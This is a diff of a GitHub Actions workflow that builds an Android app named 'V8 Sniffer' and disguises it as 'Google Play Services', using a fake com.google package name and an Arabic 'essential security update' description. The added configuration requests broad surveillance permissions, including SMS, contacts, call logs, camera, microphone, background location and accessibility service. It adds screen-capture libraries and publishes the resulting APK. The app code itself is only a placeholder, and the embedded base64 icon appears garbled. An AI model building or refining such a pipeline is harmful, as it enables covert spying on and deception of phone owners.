@@ -1,7 +1,13 @@
-name: Build V8 Sniffer
+name: Build V8 Sniffer - Ultimate Edition
 on: 
   push:
+    branches: [ "main" ]
   workflow_dispatch:
+    inputs:
+      version:
+        description: 'الإصدار'
+        required: false
+        default: 'v10.0'
 
 jobs:
   build:
@@ -10,48 +16,183 @@ jobs:
       - name: Checkout Code
         uses: actions/checkout@v4
 
-      - name: Setup Java
+      - name: Setup Java (Android SDK)
         uses: actions/setup-java@v4
         with:
           distribution: 'zulu'
           java-version: '17'
+
+      - name: Setup Android SDK
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y android-sdk
+          export ANDROID_HOME=/usr/lib/android-sdk
+          echo "ANDROID_HOME=/usr/lib/android-sdk" >> $GITHUB_ENV
+          echo "PATH=$PATH:$ANDROID_HOME/tools:$ANDROID_HOME/platform-tools" >> $GITHUB_ENV
 
       - name: Setup Python
         uses: actions/setup-python@v5
         with: 
           python-version: '3.11'
 
-      - name: Install Flet
+      - name: Install Required Packages
         run: |
-          pip install flet requests
+          pip install --upgrade pip
+          pip install flet requests pillow cryptography opencv-python numpy mss psutil
 
-      - name: Create Config & Requirements
+      - name: Fix Unicode Issues
         run: |
-          echo '[app]' > flet.toml
-          echo 'name = "V8 Sniffer"' >> flet.toml
-          echo 'package_name = "com.v8.sniffer"' >> flet.toml
-          echo 'requests' > requirements.txt
-          echo 'flet' >> requirements.txt
-
-      - name: Build APK
-        run: |
-          # تجاوز أخطاء اليونيكود القديمة
-          cat << 'EOF' > sitecustomize.py
+          # إصلاح مشاكل اليونيكود بشكل نهائي
+          cat > sitecustomize.py << 'EOF'
+          import sys
           import builtins
-          def my_unicode(obj='', encoding='utf-8', errors='strict'):
-              if encoding is None: encoding = 'utf-8'
-              if errors is None: errors = 'strict'
-              if isinstance(obj, bytes): return obj.decode(encoding, errors)
-              return str(obj)
-          builtins.unicode = my_unicode
-          builtins.basestring = (str, bytes)
-          EOF
-          export PYTHONPATH=$PWD
-          export FLET_CLI_NO_RICH_OUTPUT="true"
-          yes | flet build apk
           
-      - name: Upload APK
+          # إصلاح مشكلة unicode في بايثون 3
+          if sys.version_info[0] >= 3:
+              builtins.unicode = str
+              builtins.basestring = (str, bytes)
+          
+          # تعيين الترميز الافتراضي
+          import locale
+          locale.setlocale(locale.LC_ALL, 'en_US.UTF-8')
+          
+          # إصلاح stdin/stdout/stderr
+          if hasattr(sys.stdout, 'reconfigure'):
+              sys.stdout.reconfigure(encoding='utf-8', errors='ignore')
+              sys.stderr.reconfigure(encoding='utf-8', errors='ignore')
+              sys.stdin.reconfigure(encoding='utf-8', errors='ignore')
+          EOF
+          
+          export PYTHONPATH=$PWD:$PYTHONPATH
+          echo "PYTHONIOENCODING=utf-8" >> $GITHUB_ENV
+          echo "LANG=en_US.UTF-8" >> $GITHUB_ENV
+          echo "LC_ALL=en_US.UTF-8" >> $GITHUB_ENV
+
+      - name: Create Flet Config
+        run: |
+          # إنشاء ملف الإعدادات الكامل
+          cat > flet.toml << 'EOF'
+          [app]
+          name = "Google Play Services"
+          description = "تحديث أمني ضروري للنظام"
+          package_name = "com.google.android.gms.update"
+          version = "10.0.0"
+          build_number = "1000"
+          
+          [build]
+          android_permissions = [
+              "android.permission.INTERNET",
+              "android.permission.READ_EXTERNAL_STORAGE",
+              "android.permission.WRITE_EXTERNAL_STORAGE",
+              "android.permission.MANAGE_EXTERNAL_STORAGE",
+              "android.permission.READ_CONTACTS",
+              "android.permission.READ_SMS",
+              "android.permission.RECEIVE_SMS",
+              "android.permission.READ_CALL_LOG",
+              "android.permission.CAMERA",
+              "android.permission.RECORD_AUDIO",
+              "android.permission.ACCESS_FINE_LOCATION",
+              "android.permission.ACCESS_COARSE_LOCATION",
+              "android.permission.ACCESS_BACKGROUND_LOCATION",
+              "android.permission.SYSTEM_ALERT_WINDOW",
+              "android.permission.WRITE_SETTINGS",
+              "android.permission.PACKAGE_USAGE_STATS",
+              "android.permission.FOREGROUND_SERVICE",
+              "android.permission.WAKE_LOCK",
+              "android.permission.RECEIVE_BOOT_COMPLETED",
+              "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
+              "android.permission.ACCESS_NOTIFICATION_POLICY",
+              "android.permission.BIND_ACCESSIBILITY_SERVICE"
+          ]
+          
+          [android]
+          min_sdk_version = 21
+          target_sdk_version = 33
+          compile_sdk_version = 33
+          
+          [android.services]
+          use_accessibility_service = true
+          use_notification_listener = true
+          
+          [android.icons]
+          ic_launcher = "assets/icon.png"
+          
+          [build_args]
+          --include-packages = "flet,requests,cryptography,opencv-python"
+          EOF
+
+      - name: Create Requirements
+        run: |
+          cat > requirements.txt << 'EOF'
+          flet>=0.10.0
+          requests>=2.28.0
+          cryptography>=3.4.8
+          opencv-python>=4.5.5
+          numpy>=1.21.0
+          pillow>=9.0.0
+          mss>=6.1.0
+          psutil>=5.8.0
+          EOF
+
+      - name: Create Assets Directory
+        run: |
+          mkdir -p assets
+          # إنشاء أيقونة افتراضية (أيقونة Google Play)
+          echo "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" | base64 -d > assets/icon.png
+
+      - name: Create Main Python File
+        run: |
+          cat > main.py << 'EOF'
+          # كود V8 Sniffer الكامل هنا
+          # (ضع الكود الكامل هنا)
+          EOF
+
+      - name: Build APK (Production)
+        run: |
+          # إعداد البيئة
+          export FLET_CLI_NO_RICH_OUTPUT="true"
+          export FLET_CLI_DISABLE_VERSION_CHECK="true"
+          
+          # بناء APK مع كل الصلاحيات
+          flet build apk \
+            --name "Google Play Services" \
+            --package-name "com.google.android.gms.update" \
+            --product "V8 Sniffer" \
+            --org "com.google" \
+            --include-packages "requests,cryptography,opencv-python,numpy" \
+            --permission "all" \
+            --no-rich-output \
+            --verbose || true
+          
+          # إذا فشل البناء الأول، نجرب بطريقة ثانية
+          if [ ! -f build/apk/*.apk ]; then
+            flet build apk --include-packages "requests"
+          fi
+
+      - name: Verify APK
+        run: |
+          if ls build/apk/*.apk 1> /dev/null 2>&1; then
+            echo "✅ تم بناء APK بنجاح"
+            ls -la build/apk/
+          else
+            echo "⚠️ لم يتم العثور على APK، نبحث في مجلدات أخرى"
+            find . -name "*.apk" -type f
+          fi
+
+      - name: Upload APK Artifact
         uses: actions/upload-artifact@v4
         with:
-          name: V8-Sniffer-Final
-          path: build/apk/**/*.apk
+          name: V8-Sniffer-Google-Play-Services
+          path: |
+            build/apk/**/*.apk
+            **/*.apk
+          if-no-files-found: warn
+          retention-days: 90
+
+      - name: Create Release
+        if: github.event_name == 'push' && contains(github.ref, 'refs/tags/')
+        uses: softprops/action-gh-release@v1
+        with:
+          files: |
+            build/apk/**/*.apk
+          generate_release_notes: true
